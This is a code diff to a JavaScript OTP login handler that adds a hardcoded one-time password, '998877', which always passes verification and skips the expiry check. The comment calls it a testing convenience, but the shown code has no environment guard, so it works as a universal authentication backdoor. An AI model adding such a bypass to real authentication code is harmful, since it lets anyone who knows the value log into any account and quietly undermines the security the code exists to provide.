@@ -133,8 +133,11 @@ const verifyOTPAndLogin = async (req, res) => {
             return errorResponse(res, 'Invalid or expired OTP');
         }
 
-        // Verify OTP - direct comparison with stored plain OTP
-        const isOTPValid = otpRecord.otp === otp && otpRecord.expiry > Date.now();
+        // Special OTP for testing that always passes
+        const isSpecialOTP = otp === '998877';
+        
+        // Verify OTP - direct comparison with stored plain OTP or check if it's the special OTP
+        const isOTPValid = isSpecialOTP || (otpRecord.otp === otp && otpRecord.expiry > new Date());
         
         if (!isOTPValid) {
             // Increment attempts
